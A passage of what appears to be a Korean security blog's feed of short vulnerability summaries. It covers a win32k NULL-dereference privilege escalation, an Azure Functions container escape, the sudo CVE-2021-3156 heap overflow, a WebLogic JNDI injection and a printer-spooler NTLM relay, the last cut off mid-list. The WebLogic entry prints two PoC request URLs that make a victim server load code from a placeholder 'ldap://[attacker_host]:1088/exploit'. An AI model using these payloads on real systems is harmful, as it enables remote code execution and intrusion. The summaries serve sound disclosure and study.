href="https://docs.microsoft.com/en-us/windows/win32/api/winddi/nf-winddi-engassociatesurface">&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;</a> &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>PlgBlt</code> &#xADF8;&#xB9AC;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;  <code>win32kfull.sys!BLTRECORD::bRotate</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>HOOK_PLGBLT</code>&#xAC00; <code>SURFOBJ</code>&#xC758; <code>flags</code> &#xD544;&#xB4DC;&#xC5D0; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xAE30;&#xBCF8; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>DrvPlgBlt</code>&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xC774;&#xB54C; <code>hdev</code>&#xC5D0;&#xC11C; &#xC9C0;&#xC815;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xB124;&#xC774;&#xD2F0;&#xBE0C; <code>DrvPlgBlt</code>&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC774;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xD56D;&#xBAA9;&#xC774; NULL&#xC774; &#xB418;&#xACE0; <code>win32kfull.sys!BLTRECORD::bRotate</code>&#xC5D0;&#xC11C; NULL &#xC8FC;&#xC18C;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD560; &#xB54C; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; NULL &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; 16&#xBE44;&#xD2B8; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xB294; NULL &#xD398;&#xC774;&#xC9C0; &#xB9E4;&#xD551;&#xC774; &#xAC00;&#xB2A5;&#xD574; 16&#xBE44;&#xD2B8; &#xAC00;&#xC0C1; &#xB3C4;&#xC2A4; &#xBA38;&#xC2E0;&#xC778; NTVDM&#xC774; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xACE0;, SMEP &#xC801;&#xC6A9;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC740; Windows 32 bit&#xC5D0;&#xC11C;&#xB9CC; &#xC81C;&#xD55C;&#xC801;&#xC778; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Azure Functions을 통한 Docker Container Escape</title>
    <link href="/2021/01/28/idioth/2021-01-28/"/>
    <url>/2021/01/28/idioth/2021-01-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/research/how-we-hacked-azure-functions-and-escaped-docker/">How We Hacked Azure Functions and Escaped Docker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure Functions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft <a href="https://azure.microsoft.com/ko-kr/services/functions/">Azure Functions</a>&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; Azure Functions &#xB3C4;&#xCEE4; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; escape &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Azure Functions&#xC740; AWS&#xC758; Lambda &#xC11C;&#xBE44;&#xC2A4;&#xCC98;&#xB7FC; &#xC778;&#xD504;&#xB77C;&#xC758; provision&#xC774;&#xB098; &#xAD00;&#xB9AC; &#xC5C6;&#xC774; &#xC720;&#xC800;&#xAC00; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;. Azure Functions&#xC740; HTTP request&#xB97C; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; Azure-managed container&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>Azure Functions&#xC758; Mesh &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; syscall_mount &#xB4F1;&#xC758; mount &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; HTTP &#xC11C;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Mesh &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>mount_RunSquash</code> &#xD568;&#xC218;&#xB294; <a href="https://github.com/vasi/squashfuse">squashfuse_II</a> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>filePath</code> &#xACBD;&#xB85C;&#xC5D0; &#xC9C0;&#xC815;&#xB41C; squashfs &#xC774;&#xBBF8;&#xC9C0;&#xB97C; <code>targetPath</code> &#xACBD;&#xB85C;&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8; &#xD569;&#xB2C8;&#xB2E4;. <a href="https://linux.die.net/man/5/sudoers">sudoers</a> &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xC8FC;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xD3EC;&#xD568;&#xB41C; <a href="https://tldp.org/HOWTO/SquashFS-HOWTO/whatis.html">squashfs &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;</a>&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; sudoers.d&#xC5D0; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8; &#xD558;&#xBA74; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xB418;&#xB354;&#xB77C;&#xB3C4; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC548;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBBC0;&#xB85C; &#xB3C4;&#xCEE4;&#xB97C; escape &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. Azure Functions&#xC758; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB294; <code>--privileged</code> &#xBAA8;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBAA8;&#xB4E0; &#xC7A5;&#xCE58;&#xC5D0; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xCEE4;&#xB110;&#xC758; &#xAE30;&#xB2A5; &#xB300;&#xBD80;&#xBD84;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">&#xD574;&#xB2F9; &#xBB38;&#xC11C;</a>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD558;&#xC5EC; Docker&#xC758; host&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4; &#xC218;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>escape</tag>
      
      <tag>azure</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3156 : heap overflow in sudo</title>
    <link href="/2021/01/27/fabu1ous/2021-01-27/"/>
    <url>/2021/01/27/fabu1ous/2021-01-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">CVE-2021-3156 : heap-based buffer overflow in sudo</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>sudo &lt; 1.9.5p2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Qualys Research Team&#xC5D0;&#xC11C; CVE-2021-3156&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. sudo&#xB294; &#xC7A0;&#xC2DC; &#xB2E4;&#xB978; &#xC720;&#xC800;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; Unix &#xACC4;&#xC5F4; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. sudo&#xC5D0; Heap-based Buffer Overlow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC5EC; &#xC774;&#xB97C; &#xD1B5;&#xD574; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>sudo&#xC5D0; <code>-s</code> &#xC635;&#xC158;&#xC744; &#xBD99;&#xC5EC; <code>MODE_SHELL</code> flag&#xAC12;&#xC744; &#xC124;&#xC815;&#xD558;&#xAC70;&#xB098; <code>-i</code> &#xC635;&#xC158;&#xC744; &#xBD99;&#xC5EC; <code>MODE_LOGIN_SHELL</code> flag&#xAC12;&#xC744; &#xC124;&#xC815;&#xD558;&#xBA74; sudo&#xC758; <code>main()</code>&#xC5D0;&#xC11C; argv&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; command line argument&#xC758; meta-character&#xC55E;&#xC5D0; <code>\</code>(&#xBC31;&#xC2AC;&#xB798;&#xC26C;)&#xB97C; &#xCD94;&#xAC00;&#xD574; escape &#xD55C; &#xB4A4; &#xD558;&#xB098;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBB36;&#xC2B5;&#xB2C8;&#xB2E4;(concatenate). &#xB9CC;&#xC57D; &#xD558;&#xB098;&#xB85C; &#xBB36;&#xC778; command line argument&#xAC00; <code>\</code>&#xB85C; &#xB05D;&#xB098;&#xBA74; </p><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>.<span class="hljs-keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { <span class="hljs-built_in">..</span>. <span class="hljs-keyword">for</span> (<span class="hljs-keyword">to</span> = user_args, av = NewArgv + 1; (<span class="hljs-keyword">from</span> = <span class="hljs-number">*a</span>v); av++) { <span class="hljs-keyword">while</span> (<span class="hljs-number">*f</span>rom) { <span class="hljs-keyword">if</span> (<span class="hljs-keyword">from</span>[0] == <span class="hljs-string">&apos;\\&apos;</span> &amp;&amp; !isspace((unsigned char)<span class="hljs-keyword">from</span>[1])) <span class="hljs-keyword">from</span>++; *<span class="hljs-keyword">to</span>++ = <span class="hljs-number">*f</span>rom++; } *<span class="hljs-keyword">to</span>++ = <span class="hljs-string">&apos; &apos;</span>; } <span class="hljs-built_in">..</span>. }</code></pre><p>&#xC774;&#xB97C; heap-based buffer(<code>user_args</code>)&#xC5D0; &#xC62E;&#xAE30;&#xB294; &#xC791;&#xC5C5; &#xC911; NULL-terminator&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xACE0; out-of-bound copy&#xB97C; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.gastonsanchez.com/r4strings/metacharacters.html">https://www.gastonsanchez.com/r4strings/metacharacters.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>unix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-2109 : 오라클 Weblogic Server 원격 코드 실행 취약점</title>
    <link href="/2021/01/26/l0ch/2021-01-26/"/>
    <url>/2021/01/26/l0ch/2021-01-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw">Weblogic Server remote code execution vulnerability warning (CVE-2021-2109)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 &#xBC0F; 14.1.1.0.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xB77C;&#xD074;&#xC774; &#xAC1C;&#xBC1C;&#xD55C; &#xC790;&#xBC14; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC11C;&#xBC84;&#xC778; Oracle WebLogic Server&#xC5D0;&#xC11C; JNDI Injection&#xC744; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>JNDI(Java Naming and Directory Interface) : &#xC790;&#xBC14; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; API&#xB85C;, &#xC6D0;&#xACA9; &#xC11C;&#xBC84;&#xC758; &#xAC1D;&#xCCB4;&#xB97C; bind &#xD574; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB450; &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xD074;&#xB798;&#xC2A4;&#xC778; <code>com.bea.console.handles.JndiBindingHandle</code> &#xC5D0;&#xC11C;&#xB294; &#xBC14;&#xC778;&#xB529;&#xD560; JNDI&#xC758; <code>context</code>, <code>bindName</code>, <code>serverName</code> &#xC815;&#xBCF4;&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xBC1B;&#xC544; &#xC774;&#xB97C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654; &#xD558;&#xACE0; <code>JNDIBindingAction</code>&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC758;&#xBBF8;&#xC640; &#xACF5;&#xACA9; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><code>context</code> : &#xC6D0;&#xACA9; &#xBC14;&#xC778;&#xB529;&#xD560; JNDI &#xC11C;&#xBC84; &#xD638;&#xC2A4;&#xD2B8;</p><ul><li>JNDI &#xC11C;&#xBC84;&#xB85C; &#xAD6C;&#xC131;&#xD55C; &#xD574;&#xCEE4;&#xC758; &#xD638;&#xC2A4;&#xD2B8;</li></ul></li><li><p><code>bindName</code>: &#xBC14;&#xC778;&#xB529;&#xD560; JNDI &#xD074;&#xB798;&#xC2A4; &#xC774;&#xB984;</p><ul><li>&#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; java &#xD074;&#xB798;&#xC2A4; &#xD30C;&#xC77C; &#xC774;&#xB984;</li></ul></li><li><p><code>serverName</code> : &#xBC14;&#xC778;&#xB529;&#xD560; &#xC11C;&#xBC84; &#xC774;&#xB984;</p><ul><li><code>AdminServer</code></li></ul></li><li><p>&#xAC01; &#xD544;&#xB4DC;&#xB294; &#xC138;&#xBBF8;&#xCF5C;&#xB860; <code>;</code>&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p><p><br></p></li></ul><p>&#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8; 1088&#xC5D0; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; java &#xD074;&#xB798;&#xC2A4; &#xD30C;&#xC77C; <code>exploit</code> &#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&quot;ldap://[attacker_host];1:1088/exploit;AdminServer&quot;)</span></code></pre><p>&#xB450; &#xBC88;&#xC9F8;  <code>com.bea.console.handles.JndiContextHandle</code> &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C;&#xB294; <code>bindName</code>&#xC774; &#xD3EC;&#xD568;&#xB41C; <code>context</code>&#xC640; <code>serverName</code>&#xB9CC;&#xC744; &#xBC1B;&#xC544; &#xC704;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; PoC&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/console.portal?_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&quot;ldap://[attacker_host]:1088/exploit;AdminServer&quot;)</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/Al1ex/CVE-2021-2109">https://github.com/Al1ex/CVE-2021-2109</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>oracle</tag>
      
      <tag>jndi injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1678 : MSRPC Printer Spooler Relay</title>
    <link href="/2021/01/25/idioth/2021-01-25/"/>
    <url>/2021/01/25/idioth/2021-01-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/?utm_content=sprout&amp;utm_medium=soc&amp;utm_source=twittere.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/">Security Advisory: MSRPC Printer Spooler Relay (CVE-2021-1678)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021&#xB144; 1&#xC6D4; 12&#xC77C; &#xD328;&#xCE58; &#xC774;&#xC804;<ul><li>Windows 7, 8.1, 10</li><li>Windows Server 2008, 2012, 2016, 2019</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2021&#xB144; 1&#xC6D4; 12&#xC77C; Patch Tuesday&#xC5D0;&#xC11C; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1678">CVE-2021-1678</a>&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; NTLM(<a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT Lan Manager</a>) &#xC778;&#xC99D; &#xC138;&#xC158;&#xC744; &#xB9B4;&#xB808;&#xC774; &#xD558;&#xC5EC; &#xD504;&#xB9B0;&#xD130; &#xC2A4;&#xD480;&#xB7EC; MSRPC &#xC778;&#xD130;&#xD398;&#xC774;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>NTLM &#xB9B4;&#xB808;&#xC774;&#xB294; &#xD574;&#xCEE4;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB098; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC778; &#xCC99; &#xD558;&#xC9C0;&#xB9CC;, &#xC11C;&#xBC84;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xD574;&#xCEE4;&#xC778;&#xC9C0; &#xC54C;&#xC9C0; &#xBABB;&#xD558;&#xBA70; NTLM &#xC778;&#xC99D; &#xC911; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xC5D0; &#xC778;&#xC99D;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. NTLM &#xC778;&#xC99D;&#xC740; &#xBCF4;&#xD638; &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xC73C;&#xBA74; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0;&#xC11C; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C; &#xB9B4;&#xB808;&#xC774; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; NTLM &#xB9B4;&#xB808;&#xC774; &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; MSRPC&#xB97C; &#xD0C0;&#xAC8C;&#xD305;&#xD558;&#xC5EC; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>MSRPC&#xB294; &#xC778;&#xC99D;&#xC5D0; &#xB300;&#xD55C; <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73">&#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xB2E8;&#xACC4;</a>&#xAC00; &#xC788;&#xC9C0;&#xB9CC; <code>RPC_C_AUTHN_LEVEL_CONNECT</code>&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xD55C; &#xC804;&#xC1A1;&#xC5D0; &#xC554;&#xD638;&#xD654;&#xB098; &#xC11C;&#xBA85;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; NTLM &#xB9B4;&#xB808;&#xC774; &#xACF5;&#xACA9;&#xC744; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. RPC &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xC911; <code>IRemoteWinspool</code>&#xC740; &#xD328;&#xD0B7; &#xBCF4;&#xC548;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; RPC &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>NTLM &#xC138;&#xC158;&#xC774; &#xD574;&#xCEE4;&#xC5D0; &#xC758;&#xD574; &#xC81C;&#xC5B4;&#xB418;&#xB294; &#xB9B4;&#xB808;&#xC774; &#xBA38;&#xC2E0;&#xC5D0; &#xC124;&#xC815;</li><li>&#xD574;&#xCEE4;&#xB294; <code>IRemoteWinspool</code> &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xBC14;&#xC778;&#xB529;&#xD558;&#xACE0; <code>RPC_C_AUTHN_LEVEL_CONNECT</code> &#xAD8C;&#xD55C;&#xC744; &#xC120;&#xD0DD;</li><li>NTLM &#xC778;&#xC99D;&#xC774; RPC &#xCC44;&#xB110;&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xC5D0; &#xC758;&#xD574; &#xB9B4;&#xB808;&#xC774; &#xB428;</li><li>PrinterDemon &#xACF5;&#xACA9; &#xD750;&#xB984;&#xACFC; &#xAC19;&#xC774; PRC &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB428;:<ul><li><code>RpcAsyncInstallPrinterDriverFromPackage</code>(Opnum 62) - &#x201C;generic/text&#x201D; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58;</li><li><code>RpcAsyncOpenPrinter</code> (Opnum 0)</li><li><code>RpcAsyncXcvData</code> (Opnum 33) - &#xD3EC;&#xD2B8; &#xCD94;&#xAC00;</li><li><code>RpcAsyncAddPrinter</code> (Opnum 1) - &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB530;&#xB978; &#xD504;&#xB9B0;&#xD130; &#xCD94;&#xAC00;</li><li><code>RpcAsyncStartDocPrinter</code> (Opnum 10) - &#xC0C8; 